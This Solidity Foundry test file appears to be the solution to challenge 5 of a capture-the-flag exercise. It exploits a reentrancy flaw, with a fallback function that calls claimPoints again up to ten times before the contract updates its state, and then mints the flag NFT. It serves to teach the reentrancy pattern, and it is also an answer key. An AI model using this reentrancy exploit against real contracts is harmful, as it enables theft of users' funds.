// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import {console} from "forge-std/Test.sol";
import {BaseTest} from "../BaseTest.sol";
import {Challenge5} from "../../src/Challenge5.sol";
import {NFTFlags} from "../../src/NFTFlags.sol";

contract Challenge5Test is BaseTest {
    Challenge5 challenge5;

    uint256 callCount = 0;

    function setUp() public {
        setUpChallenges();

        vm.prank(ADMIN);
        challenge5 = new Challenge5(address(nftFlags));
        vm.prank(ADMIN);
        nftFlags.addAllowedMinter(address(challenge5));
    }

    function test_challenge5() public {
        vm.startPrank(PLAYER, PLAYER);

        // Step 1: Claim the first point
        // During this step, the contract will call `msg.sender` back, which can be handled in the fallback function below
        challenge5.claimPoints();
        callCount++;

        // Step 5: Mint the flag
        // After all 10 calls are done, we should have enough points to mint the flag
        challenge5.mintFlag();

        // DONE: You should have obtained the flag for challenge #5
        assertTrue(nftFlags.hasMinted(PLAYER, 5));
    }

    // Step 2: declare a fallback function, called during each call to `claimPoints`
    fallback() external {
        if (callCount < 10) {
            callCount++;
            // Step 3: Call `claimPoints` again
            // During this step, the contract still thinks we have 0 points, so we can call `claimPoints` again
            challenge5.claimPoints();

            // Step 4: recursively repeat until we have enough points
        }
    }
}
